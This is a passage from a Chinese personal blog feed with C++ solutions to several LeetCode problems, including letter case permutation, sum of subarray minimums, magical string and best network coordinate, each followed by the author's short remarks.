class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>搜! 搜就完了</p></blockquote><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><ul><li>可以搜索下一个alpha的位置，不必每个字符都递归，节省递归深度</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">vector&lt;string&gt; res;</span><br><span class="line"><span class="type">int</span> len;</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">letterCasePermutation</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        len = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">search</span>(s, <span class="built_in">nextAlpha</span>(s, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">search</span><span class="params">(string&amp; s, <span class="type">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index&gt;=len) &#123;</span><br><span class="line">            res.<span class="built_in">emplace_back</span>(s);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> next=<span class="built_in">nextAlpha</span>(s, index+<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">search</span>(s,next);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isupper</span>(s[index])) &#123;</span><br><span class="line">            s[index] = s[index]-<span class="string">&#x27;A&#x27;</span>+<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            s[index] = s[index]-<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">search</span>(s, next);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">nextAlpha</span><span class="params">(string&amp; s, <span class="type">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(index&lt;len &amp;&amp; !<span class="built_in">isalpha</span>(s[index])) index++;</span><br><span class="line">        <span class="keyword">return</span> index;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="1773-统计匹配检索规则的物品数量"><a href="#1773-统计匹配检索规则的物品数量" class="headerlink" title="1773. 统计匹配检索规则的物品数量"></a><a href="https://leetcode.cn/problems/count-items-matching-a-rule/">1773. 统计匹配检索规则的物品数量</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countMatches</span><span class="params">(vector&lt;vector&lt;string&gt;&gt;&amp; items, string ruleKey, string ruleValue)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> index=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(ruleKey[<span class="number">0</span>]==<span class="string">&#x27;c&#x27;</span>) &#123;</span><br><span class="line">            index=<span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(ruleKey[<span class="number">0</span>]==<span class="string">&#x27;n&#x27;</span>) &#123;</span><br><span class="line">            index=<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;&amp;item : items) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!item[index].<span class="built_in">compare</span>(ruleValue)) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>感觉直接比较第0个字符应该也很快吧？</p></blockquote><h2 id="907-子数组的最小值之和"><a href="#907-子数组的最小值之和" class="headerlink" title="907. 子数组的最小值之和"></a><a href="https://leetcode.cn/problems/sum-of-subarray-minimums/">907. 子数组的最小值之和</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">sumSubarrayMins</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = arr.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; monoStack;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">left</span><span class="params">(n)</span>, <span class="title">right</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!monoStack.<span class="built_in">empty</span>() &amp;&amp; arr[i] &lt;= arr[monoStack.<span class="built_in">back</span>()]) &#123;</span><br><span class="line">                monoStack.<span class="built_in">pop_back</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 小于栈内元素，则</span></span><br><span class="line">            left[i] = i - (monoStack.<span class="built_in">empty</span>() ? <span class="number">-1</span> : monoStack.<span class="built_in">back</span>());</span><br><span class="line">            <span class="comment">// 若空，则放入下一个序号，否则是与前一个数的距离</span></span><br><span class="line">            monoStack.<span class="built_in">emplace_back</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 得到一个单增的栈</span></span><br><span class="line">        <span class="comment">//只需要找到每个元素 arr[i] 以该元素为最右且最小的子序列的数目 left[i]，以及以该元素为最左且最小的子序列的数目 right[i]，则以 arr[i] 为最小元素的子序列的数目合计为 left[i]×right[i]</span></span><br><span class="line">        monoStack.<span class="built_in">clear</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!monoStack.<span class="built_in">empty</span>() &amp;&amp; arr[i] &lt; arr[monoStack.<span class="built_in">back</span>()]) &#123;</span><br><span class="line">                monoStack.<span class="built_in">pop_back</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            right[i] = (monoStack.<span class="built_in">empty</span>() ? n : monoStack.<span class="built_in">back</span>()) - i;</span><br><span class="line">            monoStack.<span class="built_in">emplace_back</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            ans = (ans + (<span class="type">long</span> <span class="type">long</span>)left[i] * right[i] * arr[i]) % mod; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>看了答案才会，想到是用单调栈，但是没有思路<br>$ left \times right $ 的原因是，n个元素的连续子数组的个数为 $ n \times (n-1) $</p></blockquote><h2 id="1620-网络信号最好的坐标"><a href="#1620-网络信号最好的坐标" class="headerlink" title="1620. 网络信号最好的坐标"></a><a href="https://leetcode.cn/problems/coordinate-with-maximum-network-quality/">1620. 网络信号最好的坐标</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">Power</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; towers, <span class="type">int</span> radius)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> power = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; len; j++) &#123;</span><br><span class="line">            <span class="type">double</span> d = <span class="built_in">sqrt</span>((towers[j][<span class="number">0</span>]-x)*(towers[j][<span class="number">0</span>]-x) + (towers[j][<span class="number">1</span>]-y)*(towers[j][<span class="number">1</span>]-y));</span><br><span class="line">            <span class="keyword">if</span>(d &lt;= radius) &#123;</span><br><span class="line">                power += towers[j][<span class="number">2</span>]/(<span class="number">1</span>+d);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> power;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">bestCoordinate</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; towers, <span class="type">int</span> radius)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> resx = <span class="number">0</span>, resy = <span class="number">0</span>;</span><br><span class="line">        len = towers.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> maxPower = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> x = <span class="number">0</span>; x &lt;= <span class="number">100</span>; x++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> y = <span class="number">0</span>; y &lt;= <span class="number">100</span>; y++) &#123;</span><br><span class="line">                <span class="type">int</span> power = <span class="built_in">Power</span>(x, y, towers, radius);</span><br><span class="line">                <span class="keyword">if</span>(power &gt; maxPower) &#123;</span><br><span class="line">                    maxPower = power;</span><br><span class="line">                    resx = x;</span><br><span class="line">                    resy = y;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span>(power == maxPower) &#123;</span><br><span class="line">                    <span class="type">bool</span> smaller = (x &lt; resx) || (x == resx &amp;&amp; y &lt; resy);</span><br><span class="line">                    <span class="keyword">if</span>(smaller) &#123;</span><br><span class="line">                        resx = x;</span><br><span class="line">                        resy = y;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;resx, resy&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>暴力！！就暴力，看见题干就完了，搜索空间有多大我就搜多大哈哈哈哈或或</p></blockquote><h3 id="优化-1"><a href="#优化-1" class="headerlink" title="优化"></a>优化</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">Power</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; towers, <span class="type">int</span> radius)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> power = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; len; j++) &#123;</span><br><span class="line">            <span class="type">double</span> d = <span class="built_in">sqrt</span>((towers[j][<span class="number">0</span>]-x)*(towers[j][<span class="number">0</span>]-x) + (towers[j][<span class="number">1</span>]-y)*(towers[j][<span class="number">1</span>]-y));</span><br><span class="line">            <span class="keyword">if</span>(d &lt;= radius) &#123;</span><br><span class="line">                power += towers[j][<span class="number">2</span>]/(<span class="number">1</span>+d);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> power;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">bestCoordinate</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; towers, <span class="type">int</span> radius)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> resx = <span class="number">0</span>, resy = <span class="number">0</span>;</span><br><span class="line">        len = towers.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> maxPower = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> x = <span class="number">0</span>; x &lt;= <span class="number">50</span>; x++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> y = <span class="number">0</span>; y &lt;= <span class="number">50</span>; y++) &#123;</span><br><span class="line">                <span class="type">int</span> power = <span class="built_in">Power</span>(x, y, towers, radius);</span><br><span class="line">                <span class="keyword">if</span>(power &gt; maxPower) &#123;</span><br><span class="line">                    maxPower = power;</span><br><span class="line">                    resx = x;</span><br><span class="line">                    resy = y;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;resx, resy&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>大于50的就没必要了，只会衰减</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1662-检查两个字符串数组是否相等&quot;&gt;&lt;a href=&quot;#1662-检查两个字符串数组是否相等&quot; class=&quot;headerlink&quot; title=&quot;1662. 检查两个字符串数组是否相等&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/check-if-two-string-arrays-are-equivalent/&quot;&gt;1662. 检查两个字符串数组是否相等&lt;/a&gt;&lt;/h2&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;arrayStringsAreEqual&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(vector&amp;lt;string&amp;gt;&amp;amp; word1, vector&amp;lt;string&amp;gt;&amp;amp; word2)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;join&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;move&lt;/span&gt;(word1)) == &lt;span class=&quot;built_in&quot;&gt;join&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;move&lt;/span&gt;(word2));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;string &lt;span class=&quot;title&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(vector&amp;lt;string&amp;gt;&amp;amp;&amp;amp; word)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        string s;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; len = word.&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(len &amp;lt;= &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; s;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; len&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            s += word[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        s+=word[len&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; s;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;blockquote&gt;
&lt;p&gt;实现一个join函数就好了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;481-神奇字符串&quot;&gt;&lt;a href=&quot;#481-神奇字符串&quot; class=&quot;headerlink&quot; title=&quot;481. 神奇字符串&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/magical-string/&quot;&gt;481. 神奇字符串&lt;/a&gt;&lt;/h2&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;magicalString&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; n)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; bit = &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; count = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;bool&lt;/span&gt; q[&lt;span class=&quot;number&quot;&gt;100005&lt;/span&gt;] = &amp;#123;&lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; queue_front = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; queue_rear = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;bool&lt;/span&gt; cur=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;bool&lt;/span&gt; gen=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(bit &amp;lt; n) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            bit += cur+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            q[queue_front++] = gen;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(cur) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                q[queue_front++] = gen;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            gen=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;-gen;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            count+=gen?cur+gen:&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            cur = q[queue_rear++];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; count -(bit&amp;gt;n &amp;amp;&amp;amp; gen);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;blockquote&gt;
&lt;p&gt;关键在于想清楚如何生成这个神奇字符串，题目中说，s的前几个字符是12211&lt;br&gt;1生成1,s&amp;#x3D;1&lt;br&gt;2生成22，因为前一个1生成了1，这个2不能也生成1,s&amp;#x3D;122&lt;br&gt;2生成11，因为前一个2生成了2，这个2不能也生成2,s&amp;#x3D;12211&lt;br&gt;1生成2，前一个2生成了1，这个1就只能生成2了,s&amp;#x3D;122112&lt;br&gt;1生成1,s&amp;#x3D;1221121&lt;br&gt;2生成22,s&amp;#x3D;122112122&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>6.824-lab1-Mapreduce</title>
    <link href="https://jingtianer.github.io/home/2022/10/28/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/6.824/lab1/"/>
